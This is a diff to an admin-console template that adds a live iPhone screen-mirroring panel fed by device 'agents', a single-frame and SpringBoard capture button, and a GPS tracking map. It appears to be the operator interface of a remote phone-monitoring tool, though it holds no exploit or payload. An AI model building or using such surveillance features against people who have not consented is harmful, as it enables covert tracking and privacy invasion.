@@ -16,24 +16,72 @@
 
     {% if section.slug == 'screen' %}
     <section class="panel">
-      <header><h2>Live screen</h2><span class="muted" id="live-state">stopped</span></header>
-      <div class="live-wrap">
-        <div class="live-frame"><img id="live-img" alt=""></div>
-        <div class="live-side">
-          <p class="muted">Pick a device, then start the stream. Frames arrive over the agent
-            API at roughly 2 fps; the device posts them from its screen-capture task.</p>
-          <div class="hz-field" style="max-width:320px;margin:12px 0">
+      <header>
+        <div>
+          <h2>iPhone shell</h2>
+          <p class="muted" style="margin:4px 0 0">Live MJPEG stream at ~2 fps. Frames come from the
+            device's screen-capture task; the shell mirrors them as they arrive.</p>
+        </div>
+        <div class="hz-btn-group"><span class="hz-live-pill" id="live-pill">OFFLINE</span></div>
+      </header>
+
+      <div class="shell-stage">
+        <div class="phone" id="phone">
+          <span class="phone__btn phone__btn--volup"></span>
+          <span class="phone__btn phone__btn--voldown"></span>
+          <span class="phone__btn phone__btn--power"></span>
+          <div class="phone__island"></div>
+          <div class="phone__screen">
+            <img id="live-img" alt="">
+            <div class="phone__empty" id="phone-empty">NO SIGNAL</div>
+          </div>
+        </div>
+
+        <div class="shell-controls">
+          <div class="hz-field">
+            <label class="hz-label">Device</label>
             <select class="hz-input" id="live-device">
               {% for a in agents %}<option value="{{ a.id }}">{{ a.id }}</option>{% endfor %}
             </select>
           </div>
+
           <div class="hz-btn-group">
             <button class="hz-btn" type="button" onclick="hzLive(true)">Start stream</button>
             <button class="hz-btn hz-btn--ghost" type="button" onclick="hzLive(false)">Stop</button>
+            <button class="hz-btn hz-btn--ghost" type="button" onclick="hzFrame()">Single frame</button>
+            <button class="hz-btn hz-btn--ghost" type="button" onclick="hzSB()">SpringBoard</button>
           </div>
-          <p class="muted" id="live-note" style="margin-top:12px;font-size:.8rem"></p>
+
+          <div class="hz-field">
+            <label class="hz-label">Zoom</label>
+            <div class="hz-btn-group" id="zoom-group">
+              <button class="hz-btn hz-btn--sm hz-btn--ghost" data-zoom="260" type="button">0.75×</button>
+              <button class="hz-btn hz-btn--sm" data-zoom="340" type="button">1×</button>
+              <button class="hz-btn hz-btn--sm hz-btn--ghost" data-zoom="460" type="button">1.5×</button>
+              <button class="hz-btn hz-btn--sm hz-btn--ghost" data-zoom="640" type="button">2×</button>
+              <button class="hz-btn hz-btn--sm hz-btn--ghost" type="button" onclick="hzFull()">Fullscreen</button>
+            </div>
+          </div>
+
+          <div class="shell-status">
+            <div class="stat-line"><span>State</span><b id="live-state">stopped</b></div>
+            <div class="stat-line"><span>Last frame</span><b id="frame-at">—</b></div>
+            <div class="stat-line"><span>Frame size</span><b id="frame-bytes">—</b></div>
+            <div class="stat-line"><span>Device</span><b id="live-note">—</b></div>
+          </div>
         </div>
       </div>
+    </section>
+    {% endif %}
+
+    {% if section.slug == 'location' %}
+    <section class="panel">
+      <header><h2>Live position</h2></header>
+      {% if map_src %}
+        <iframe class="map" src="{{ map_src }}" loading="lazy"></iframe>
+      {% else %}
+        <p class="muted">No GPS fixes yet. Dispatch <b>Locate once</b> or <b>Start tracking</b> on a device.</p>
+      {% endif %}
     </section>
     {% endif %}
 
@@ -41,7 +89,9 @@
       <header>
         <div>
           <h2>{{ section.label }}</h2>
-          <p class="muted" style="margin:4px 0 0">{{ section.blurb }}</p>
+          <p class="muted" style="margin:4px 0 0">{{ section.blurb }}
+            <span class="hz-count">{{ record_count }}</span>
+          </p>
         </div>
         {% if actions %}
         <form method="post" action="/admin/console" class="hz-btn-group">
@@ -132,22 +182,80 @@
   </main>
 </div>
 <script>
+const phone = document.getElementById('phone');
+const liveImg = document.getElementById('live-img');
+const livePill = document.getElementById('live-pill');
+const liveState = document.getElementById('live-state');
+const liveNote = document.getElementById('live-note');
+const phoneEmpty = document.getElementById('phone-empty');
+
+function hzDevice(){
+  const s = document.getElementById('live-device');
+  return s ? s.value : '';
+}
+
 function hzLive(on){
-  var img = document.getElementById('live-img');
-  var sel = document.getElementById('live-device');
-  var st = document.getElementById('live-state');
-  var note = document.getElementById('live-note');
-  if (!img) return;
-  var id = sel ? sel.value : '';
-  if (on && id) {
-    img.src = '/api/agent/' + encodeURIComponent(id) + '/screen/stream?t=' + Date.now();
-    if (st) st.textContent = 'live';
-    if (note) note.textContent = 'streaming ' + id;
+  const id = hzDevice();
+  if(on && id){
+    liveImg.src = '/api/agent/' + encodeURIComponent(id) + '/screen/stream?t=' + Date.now();
+    livePill.textContent = 'LIVE';
+    livePill.classList.add('on');
+    liveState.textContent = 'live';
+    if(phoneEmpty) phoneEmpty.style.display = 'none';
   } else {
-    img.removeAttribute('src');
-    if (st) st.textContent = 'stopped';
-    if (note) note.textContent = id ? 'stopped' : 'no device selected';
+    liveImg.removeAttribute('src');
+    livePill.textContent = 'OFFLINE';
+    livePill.classList.remove('on');
+    liveState.textContent = 'stopped';
+    if(phoneEmpty) phoneEmpty.style.display = 'grid';
   }
 }
+
+function hzFrame(){
+  const id = hzDevice();
+  if(!id) return;
+  liveImg.src = '/api/agent/' + encodeURIComponent(id) + '/screen/latest?t=' + Date.now();
+  if(phoneEmpty) phoneEmpty.style.display = 'none';
+  liveState.textContent = 'frame';
+}
+
+async function hzSB(){
+  const id = hzDevice();
+  if(!id) return;
+  liveState.textContent = 'queued SpringBoard capture';
+  await fetch('/admin/console', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'device=' + encodeURIComponent(id) +
+          '&action=' + encodeURIComponent('sb_screen_frame|{}') + '&back=screen'
+  });
+}
+
+document.querySelectorAll('#zoom-group [data-zoom]').forEach(function(btn){
+  btn.addEventListener('click', function(){
+    document.documentElement.style.setProperty('--hz-phone-w', btn.dataset.zoom + 'px');
+    document.querySelectorAll('#zoom-group [data-zoom]').forEach(b => b.classList.remove('hz-btn--active'));
+    btn.classList.add('hz-btn--active');
+  });
+});
+
+function hzFull(){ phone.classList.toggle('is-full'); }
+
+async function hzStatus(){
+  const id = hzDevice();
+  if(!id) return;
+  try{
+    const r = await fetch('/api/agent/' + encodeURIComponent(id) + '/status');
+    if(!r.ok) return;
+    const d = await r.json();
+    const f = d.last_frame;
+    if(f && f.at){
+      document.getElementById('frame-at').textContent = new Date(f.at * 1000).toLocaleTimeString();
+      document.getElementById('frame-bytes').textContent = (f.bytes / 1024).toFixed(1) + ' KB';
+    }
+    liveNote.textContent = d.online ? id + ' · online' : id + ' · offline';
+  }catch(e){}
+}
+if(phone){ setInterval(hzStatus, 3000); hzStatus(); }
 </script>
 {% include 'partials/foot.html' %}
